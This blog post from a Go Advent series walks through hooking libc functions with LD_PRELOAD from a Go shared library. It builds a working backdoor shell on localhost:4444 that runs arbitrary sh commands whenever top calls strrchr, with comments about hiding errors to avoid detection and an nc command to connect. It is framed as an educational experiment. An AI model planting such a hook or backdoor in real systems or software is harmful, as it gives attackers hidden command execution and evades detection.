+++
author = ["Matt Bostock"]
date = "2015-12-09T08:00:00+00:00"
title = "Hooking libc using Go shared libraries"
series = ["Advent 2015"]
+++

[Alastair O'Neill][] gave a talk at the [BSides Manchester][] security
conference in August about userland [rootkits][] that use the
`LD_PRELOAD` mechanism. Most of these rootkits are written in C. I knew
that as of version 1.5, Go supports a build mode for shared libraries
and having seen the talk, I wondered if I could write something similar
in Go and learn something about `LD_PRELOAD`, cgo and building Go shared
libraries in the process.

Disclaimer: I'm not a security researcher and the code here is purely an
experiment for educational purposes.

[BSides Manchester]: http://www.bsidesmcr.org.uk/
[Alastair O'Neill]: https://twitter.com/_ta0
[rootkits]: https://en.wikipedia.org/wiki/Rootkit

## How LD_PRELOAD rootkits work

An `LD_PRELOAD` [rootkit][] works by implementing alternative versions
of functions provided by the [libc][] library that many Unix binaries
[link to dynamically][]. Using these 'hooks', the rootkit can evade
detection by modifying the behaviour of the functions and bypassing
authentication mechanisms, e.g. [PAM][], to provide an attacker with a
backdoor such as an SSH login using credentials configured by the
rootkit.

[rootkit]: https://en.wikipedia.org/wiki/Rootkit
[link to dynamically]: https://en.wikipedia.org/wiki/Dynamic_linker

For example, the [Azazel][] rootkit hooks into the [fopen][] function
and [conceals evidence of network activity or files related to the
rootkit](https://github.com/chokepoint/azazel/blob/16ca8ac6ed7280e0da73c0f7a166c84ea03ebaa7/azazel.c#L287-L300).
If there is nothing to hide, Azazel [invokes the original libc
function](https://github.com/chokepoint/azazel/blob/16ca8ac6ed7280e0da73c0f7a166c84ea03ebaa7/azazel.c#L299)
so that the application behaves as normal from the user's perspective.

Using `LD_PRELOAD` to hook into other libraries is an old trick and can
[usefully be used][] for debugging applications, especially when you
don't have access to an application's source code.

[libc]: https://en.wikipedia.org/wiki/C_standard_library
[PAM]: https://en.wikipedia.org/wiki/Pluggable_authentication_module
[Azazel]: https://github.com/chokepoint/azazel
[fopen]: http://www.gnu.org/software/libc/manual/html_node/Opening-Streams.html
[usefully be used]: https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

## Shared C libraries in Go

Go 1.5 introduced [new execution modes][], or 'build modes', including
the ability to build Go packages into a shared C library by passing the
`-buildmode=c-shared` flag to the Go tool.

This means that non-Go programs can invoke functions from a Go package
that has been compiled into a shared C library.

The shared library is created using the Go tool:

```sh
$ go build -buildmode=c-shared -o library_name.so main.go
$ file backdoor.so
backdoor.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=c554a198148f8b50e3c3a99024303f1d8a0cf066, not stripped
```

We can dynamically link to the `.so` [shared object file][] we have
created using the `LD_PRELOAD` environment variable, for example:

```sh
$ LD_PRELOAD=./library_name.so top
```

[new execution modes]: https://docs.google.com/document/d/1nr-TQHw_er6GOQRsF6T43GGhFDelrAP0NqSS_00RgZQ/edit?pli=1#heading=h.44n2lm20ate5
[shared object file]: http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html

## cgo: Calling C from Go and vice-versa

For our Go functions to be visible to C programs, we have to export them
by adding a [cgo][] comment directly above the Go function:

cgo lets Go packages call C code and export Go functions to be called by
C code; you can find out more in the [Go blog article][].

[cgo]: https://golang.org/cmd/cgo/
[Go blog article]: http://blog.golang.org/c-go-cgo

```go
//export FunctionName
func FunctionName() {...}
```

We also have to import the `C` pseudo-package:

```go
import "C"
```

## Overriding a libc function

To override the behaviour of a libc function, we export our function so
that it is visible to C programs as above:

```go
//export strrchr
func strrchr(s *C.char, c C.int) *C.char {...}
```

Note that we must match the function signature of the original libc
function.  You can see that we're using the types provided by the `C`
pseudo-package.

In the body of our function, we could re-implement the original libc
function, however it's probably easier for us just to call the original
libc function. We do that by dynamically linking to the original libc
library, and invoking the original function from inside our wrapper
function.

There's a [dynamic library loader for Go][] on GitHub called `dl`. We
can open the libc library using `dl.Open()`:

```go
lib, err := dl.Open("libc", 0)
if err != nil {
        log.Fatalln(err)
}
defer lib.Close()
```

We can then using `dl.Sym()` to load a symbol (in our case, a function)
from libc into a pointer. Here, we load the symbol for the `strrchr`
function into a pointer named `old_strrchr`:

```go
var old_strrchr func(s *C.char, c C.int) *C.char
lib.Sym("strrchr", &old_strrchr)
```

Next, we invoke the original `strrchr` function and return its return
value in our wrapper function. The whole wrapper function looks like
this:

```go
//export strrchr
func strrchr(s *C.char, c C.int) *C.char {
        // Code to alter behaviour of original function
        // goes here

        lib, err := dl.Open("libc", 0)
        if err != nil {
                log.Fatalln(err)
        }
        defer lib.Close()

        var old_strrchr func(s *C.char, c C.int) *C.char
        lib.Sym("strrchr", &old_strrchr)

        return old_strrchr(s, c)
}
```

[dynamic library loader for Go]: https://github.com/rainycape/dl

## Writing a simple remote shell in Go

We now know how to hook into a libc function. For fun, let's try writing
a simple 'backdoor' shell server in Go that binds to a port and accepts
arbitrary commands whenever the libc function is invoked.

For this, we'll use the [`net/textproto`][] package, part of the Go
standard library, which "implements generic support for text-based
request/response protocols in the style of HTTP, NNTP, and SMTP".

First, we bind to a TCP port using `net.Listen()` from the `net`
package:

```go
// Bind to localhost for our example so we don't inadvertently
// open ourselves up to an attack over the network
ln, err := net.Listen("tcp", "localhost:4444")
if err != nil {
        return
}
```

This providers us with a `Listener` on which we can accept connections:

```go
for {
        conn, err := ln.Accept()
        if err != nil {
                // Don't log an error here otherwise we'd reveal the rootkit ;-)
                continue
        }

        go handleConnection(conn)
}
```

Whenever a connection is accepted, we call `handleConnection()` in a
goroutine, which allows us to handle multiple connections concurrently.

The whole `backdoor()` function looks like this:

```go
func backdoor() {
        ln, err := net.Listen("tcp", "localhost:4444")
        if err != nil {
                // Ignore errors to avoid detection
                return
        }

        for {
                conn, err := ln.Accept()
                if err != nil {
                        continue
                }

                go handleConnection(conn)
        }
}
```

In `handleConnection()`, we create a buffered I/O reader to read from
the connection using `bufio.NewReader()`. We then pass the buffered I/O
reader to `textproto.NewReader()`, which provides convenience methods
for reading from a text-based protocol connection, such as
`textproto.ReadLine()`.

```go
reader := bufio.NewReader(conn)
tp := textproto.NewReader(reader)
```

We then pass the line we read from the connection to `sh`, commonly
bash, as a command and write the output back to the connection.

The whole `handleConnection()` function looks like this:

```go
func handleConnection(conn net.Conn) {
        reader := bufio.NewReader(conn)
        tp := textproto.NewReader(reader)

        for {
                input, err := tp.ReadLine()
                if err != nil {
                        log.Println("Error reading:", err.Error())
                        break
                }

                cmd := exec.Command("/usr/bin/env", "sh", "-c", input)
                output, err := cmd.CombinedOutput()
                if err != nil {
                        conn.Write([]byte(err.Error() + "\n"))
                }

                conn.Write(output)
        }

        conn.Close()
}
```

[`net/textproto`]: https://golang.org/pkg/net/textproto/

## Starting the remote shell when the libc function is called

Let's try starting the remote shell whenever our target application
tries to invoke a given libc function.

We're going to start the remote shell server in a goroutine, so it can
continue working in the background while we invoke the origin libc
function being called.

In this example, I'm hooking into the `strrchr()` libc function, simply
because it's used early on by top and it has a simple function signature
that's easy to implement in cgo. If this were a rootkit, you might be
hooking `fopen()` and `stat()`, but for our example, `strrchr()` will
suffice:

```go
//export strrchr
func strrchr(s *C.char, c C.int) *C.char {
        // Start remote shell
        go backdoor()

        lib, err := dl.Open("libc", 0)
        if err != nil {
                log.Fatalln(err)
        }
        defer lib.Close()

        var old_strrchr func(s *C.char, c C.int) *C.char
        lib.Sym("strrchr", &old_strrchr)

        // Call original libc functional and return its return value
        return old_strrchr(s, c)
}
```

## Testing it out

To compile the shared C library, use `go build` with the `-buildmode`
flag:

```sh
$ go build -buildmode=c-shared -o backdoor.so main.go
```

If we set the `LD_PRELOAD` environment variable to use our shared
library and invoke `top` under Linux, we can then connect to the remote
shell using `netcat` or `telnet`:

```sh
$ LD_PRELOAD=./backdoor.so top
```

```sh
# In another terminal
$ nc localhost 4444
[...type your commands here...]
```

You should be able to send commands so long as the top process is
running.

## Conclusion

The code presented here was an experiment I wrote for fun but it
highlights how easy it is to write a server using a text-based protocol
in Go and the power of Go shared libraries, for example the ability to
start a goroutine from a C application.

You can find find the [example code][] in full on GitHub.

[example code]: https://github.com/mattbostock/go-ldpreload-backdoor
